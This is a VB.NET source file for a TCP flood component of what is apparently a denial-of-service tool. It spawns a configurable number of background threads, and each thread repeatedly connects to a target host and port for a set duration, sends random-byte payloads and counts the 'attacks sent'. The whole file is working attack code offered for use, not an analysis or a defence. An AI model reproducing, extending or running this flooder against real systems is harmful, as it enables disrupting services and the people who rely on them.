Imports System.Text
Imports System.Threading

Public Class TCP
    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Private msgLength As Integer
    Private _Floodsbase As Floodsbase
    Public Sub New(ByVal model As TcpModel, ByVal Floodsbase As Floodsbase)
        _Floodsbase = Floodsbase
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.Host
            Port = model.Port
            ThreadstoUse = model.ThreadstoUse
            TimetoAttack = model.Time
            msgLength = model.Length
            Threads = New Thread(ThreadstoUse - 1) {}
            _Floodsbase.SetMessage("TCP attack")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            _Floodsbase.SetMessage("A TCP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
        End If
    End Sub

    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            _Floodsbase.SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            _Floodsbase.SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0

        Else
            _Floodsbase.SetMessage("No TCP Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim hostip As Net.IPAddress = Net.IPAddress.Parse(Net.Dns.GetHostAddresses(HostToAttack)(0).ToString())
            Dim hostep As New Net.IPEndPoint(hostip, Port)

            Do While (stopwatch.Elapsed < span)
                Try
                    Dim random As New Random
                    Dim buffer As Byte() = New Byte(msgLength - 1) {}
                    Dim i As Integer
                    For i = 0 To msgLength - 1
                        buffer(i) = CByte(random.Next(0, 100))
                    Next i
                    Dim tcpc
                    tcpc = New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Tcp)
                    tcpc.Connect(hostep)
                    tcpc.SendTo(buffer, hostep)

                    attacks = attacks + 1
                    _Floodsbase.Set_AttackUpStrengOnByte(attacks * msgLength)
                    Dim bytes As Integer = 0
                    Dim sb = New StringBuilder()
                    Dim bytesReceived As Byte() = New Byte(255) {}

                    Do
                        bytes = tcpc.Receive(bytesReceived, bytesReceived.Length, 0)
                        sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                    Loop Until bytes > 0

                    _Floodsbase.Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)

                    tcpc.Close()
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try

        Ended()
    End Sub
End Class
